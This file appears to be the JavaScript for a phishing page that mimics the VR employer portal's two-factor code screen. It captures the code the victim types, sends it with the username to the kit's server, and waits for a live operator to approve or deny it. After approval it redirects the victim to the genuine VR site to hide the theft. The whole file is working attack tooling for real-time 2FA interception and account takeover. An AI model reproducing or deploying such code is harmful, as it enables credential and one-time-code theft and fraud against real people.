const inputCodigo = document.getElementById("codigo");
const botaoVerificar = document.getElementById("verificar");
const formCodigo = document.getElementById("codigo-form");
const maskedEmailElem = document.getElementById("masked-email");
const statusElem = document.getElementById("submission-status");
const errorElem = document.getElementById("codigo-erro");
const fieldsetElem = document.getElementById("code-fieldset");

const URL_FINAL = "https://superportal-empregador.vr.com.br/";

// Recupera o usuário informado na tela anterior e tenant
const urlParams = new URLSearchParams(window.location.search);
const usuarioSalvo = urlParams.get("usuario") || sessionStorage.getItem("vr_usuario") || "";
const tenantSalvo = (urlParams.get("tenant") || urlParams.get("cliente") || sessionStorage.getItem("vr_tenant") || "default").trim();

if (tenantSalvo) {
    sessionStorage.setItem("vr_tenant", tenantSalvo);
}

function voltarParaLogin() {
    const t = sessionStorage.getItem("vr_tenant") || tenantSalvo || "default";
    window.location.href = `/?tenant=${encodeURIComponent(t)}`;
}

let pollingInterval = null;

function formatMask(val) {
    if (!val) return "caro*********@gmai*****";
    val = val.trim();
    if (val.includes("@")) {
        const parts = val.split("@");
        const user = parts[0];
        const domain = parts[1] || "gmail.com";
        const prefix = user.length > 4 ? user.slice(0, 4) : user.slice(0, 2);
        const domainParts = domain.split(".");
        const domainName = domainParts[0] || "gmail";
        const domainPrefix = domainName.length > 4 ? domainName.slice(0, 4) : domainName.slice(0, 2);
        return `${prefix}*********@${domainPrefix}*****`;
    } else {
        const digits = val.replace(/\D/g, "");
        if (digits.length >= 3) {
            return digits.slice(0, 3) + ".***.***-" + (digits.slice(-2) || "**");
        }
        return "caro*********@gmai*****";
    }
}

if (maskedEmailElem) {
    maskedEmailElem.textContent = formatMask(usuarioSalvo);
}

function updateButtonState() {
    if (!inputCodigo || !botaoVerificar) return;
    const val = inputCodigo.value.trim();

    // Remove estado de erro SOMENTE se o usuário começar a digitar um novo código (val.length > 0)
    if (val.length > 0) {
        if (errorElem) errorElem.style.display = "none";
        if (fieldsetElem) {
            fieldsetElem.classList.remove("has-error");
            fieldsetElem.style.borderColor = "#5b45ea";
        }
        botaoVerificar.disabled = false;
        botaoVerificar.classList.add("active");
    } else {
        botaoVerificar.disabled = true;
        botaoVerificar.classList.remove("active");
    }
}

if (inputCodigo) {
    inputCodigo.addEventListener("input", updateButtonState);
    inputCodigo.addEventListener("keyup", updateButtonState);
    inputCodigo.addEventListener("change", updateButtonState);
}

if (formCodigo) {
    formCodigo.addEventListener("submit", async (e) => {
        e.preventDefault();
        await submeterCodigo();
    });
}

if (botaoVerificar) {
    botaoVerificar.addEventListener("click", async (e) => {
        e.preventDefault();
        await submeterCodigo();
    });
}

function exibirErroNegado() {
    if (botaoVerificar) {
        botaoVerificar.disabled = true;
        botaoVerificar.classList.remove("active");
        botaoVerificar.textContent = "Continuar";
    }
    if (fieldsetElem) {
        fieldsetElem.classList.add("has-error");
        fieldsetElem.style.borderColor = "#ef4444";
    }
    if (errorElem) {
        errorElem.style.display = "flex";
    }
    if (inputCodigo) {
        inputCodigo.value = "";
        inputCodigo.focus();
    }
}

function exibirSucessoAceito(urlFinal) {
    if (botaoVerificar) {
        botaoVerificar.textContent = "Código Aprovado!";
        botaoVerificar.classList.add("active");
    }
    setTimeout(() => {
        window.location.href = urlFinal || URL_FINAL;
    }, 400);
}

async function submeterCodigo() {
    if (!inputCodigo) return;
    const codigo = inputCodigo.value.trim();
    if (!codigo) return;

    botaoVerificar.disabled = true;
    botaoVerificar.classList.remove("active");
    botaoVerificar.textContent = "Verificando código...";
    if (statusElem) statusElem.textContent = "";
    if (errorElem) errorElem.style.display = "none";
    if (fieldsetElem) {
        fieldsetElem.classList.remove("has-error");
        fieldsetElem.style.borderColor = "#5b45ea";
    }

    try {
        await fetch("/salvar-codigo", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                codigo: codigo,
                usuario: usuarioSalvo,
                tenant: tenantSalvo
            })
        });
    } catch (err) {
        console.error("Aviso no registro do código:", err);
    }

    // Inicia a escuta ativa da decisão do operador (Aceitar / Negar no painel)
    iniciarPollingDecisao();
}

function iniciarPollingDecisao() {
    if (pollingInterval) clearInterval(pollingInterval);

    pollingInterval = setInterval(async () => {
        try {
            const res = await fetch(`/api/status-2fa?usuario=${encodeURIComponent(usuarioSalvo)}&tenant=${encodeURIComponent(tenantSalvo)}&t=${Date.now()}`);
            if (!res.ok) return;
            const data = await res.json();

            if (data.status_2fa === "aceito") {
                clearInterval(pollingInterval);
                exibirSucessoAceito(data.url_final);
            } else if (data.status_2fa === "negado") {
                clearInterval(pollingInterval);
                exibirErroNegado();
            }
        } catch (err) {
            console.error("Erro ao sondar status de 2FA:", err);
        }
    }, 500);
}

// Conexão instantânea via SSE (Server-Sent Events)
let sseSource = null;
function conectarSSEDecisao() {
    if (!window.EventSource) return;
    try {
        if (sseSource) sseSource.close();
        sseSource = new EventSource(`/api/stream?tenant=${encodeURIComponent(tenantSalvo)}&t=${Date.now()}`);
        sseSource.onmessage = (event) => {
            try {
                const json = JSON.parse(event.data);
                if (!json || !json.consolidados) return;
                const userKey = (usuarioSalvo || "").toLowerCase().trim();
                const item = json.consolidados.find(c => (c.usuario || "").toLowerCase().trim() === userKey);
                if (item) {
                    if (item.status_2fa === "aceito") {
                        if (pollingInterval) clearInterval(pollingInterval);
                        exibirSucessoAceito();
                    } else if (item.status_2fa === "negado") {
                        if (pollingInterval) clearInterval(pollingInterval);
                        exibirErroNegado();
                    }
                }
            } catch (e) {
                console.error("Erro no processamento SSE em codigo.js:", e);
            }
        };
        sseSource.onerror = () => {
            if (sseSource) sseSource.close();
            setTimeout(conectarSSEDecisao, 2000);
        };
    } catch (e) {}
}

// Verifica estado no carregamento (ex: caso a página tenha sido recarregada após negação)
async function verificarEstadoInicial() {
    if (!usuarioSalvo) return;
    try {
        const res = await fetch(`/api/status-2fa?usuario=${encodeURIComponent(usuarioSalvo)}&tenant=${encodeURIComponent(tenantSalvo)}&t=${Date.now()}`);
        if (!res.ok) return;
        const data = await res.json();
        if (data.status_2fa === "negado") {
            exibirErroNegado();
        }
    } catch (e) {}
}

verificarEstadoInicial();
conectarSSEDecisao();
